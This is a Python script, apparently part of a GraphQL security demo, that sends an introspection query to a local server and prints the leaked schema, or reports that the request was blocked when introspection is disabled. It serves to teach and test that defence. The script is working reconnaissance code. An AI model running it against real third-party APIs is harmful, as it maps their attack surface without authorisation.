"""
Introspection Abuse Attack — "The Map Maker"
=============================================
Sends the __schema introspection query to the GraphQL endpoint.
Without protection the server hands back the complete API blueprint:
all types, fields, mutations, relationships.

Run against VULNERABLE server:  DISABLE_INTROSPECTION=false  → full schema returned
Run against SECURED   server:   DISABLE_INTROSPECTION=true   → request blocked
"""
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

import requests
from colorama import Fore, Style, init

init(autoreset=True)

BASE = "http://localhost:5001"

INTROSPECTION_QUERY = """
{
  __schema {
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
"""


def run_attack(label: str):
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"  INTROSPECTION ABUSE  [{label}]")
    print(f"{'='*60}{Style.RESET_ALL}")
    print("Sending __schema introspection query ...\n")

    r = requests.post(
        f"{BASE}/graphql",
        json={"query": INTROSPECTION_QUERY},
        timeout=10,
    )

    if r.status_code == 400:
        err = r.json().get("errors", [{}])[0].get("message", "")
        print(f"{Fore.GREEN}[RESULT] ATTACK BLOCKED — server returned 400{Style.RESET_ALL}")
        print(f"  Server message: {err}")
        return

    data = r.json()
    if "errors" in data:
        print(f"{Fore.GREEN}[RESULT] ATTACK BLOCKED — introspection returned errors{Style.RESET_ALL}")
        print(f"  {data['errors'][0]['message']}")
        return

    types = data.get("data", {}).get("__schema", {}).get("types", [])
    user_types = [t for t in types if not t["name"].startswith("__")]

    print(f"{Fore.RED}[RESULT] ATTACK SUCCEEDED — full schema leaked!{Style.RESET_ALL}")
    print(f"\n  Discovered {len(user_types)} application types:\n")
    for t in user_types:
        fields = t.get("fields") or []
        field_names = [f["name"] for f in fields]
        print(f"  {Fore.YELLOW}{t['name']}{Style.RESET_ALL} ({t['kind']})")
        if field_names:
            print(f"    fields: {', '.join(field_names)}")


if __name__ == "__main__":
    run_attack("live server")
